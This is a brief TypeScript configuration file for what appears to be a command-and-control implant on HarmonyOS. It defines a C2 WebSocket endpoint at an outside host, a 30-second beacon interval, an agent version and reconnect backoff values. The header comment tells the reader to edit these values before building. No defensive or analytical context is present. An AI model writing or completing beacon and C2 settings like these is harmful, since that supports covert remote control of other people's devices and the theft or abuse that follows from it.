/**
 * Agent runtime configuration.
 * Edit these values before building, or override via environment variables
 * if your DevEco Studio build system supports them.
 */
export const Config = {
  C2_WS_URL:        "wss://c2.bixtx.com:3001",
  BEACON_INTERVAL:  30_000,          // milliseconds
  AGENT_VERSION:    "4.7.2",
  PLATFORM:         "harmony",
  RECONNECT_DELAY:  2_000,           // initial backoff ms
  MAX_RECONNECT:    60_000,          // maximum backoff cap ms
} as const;
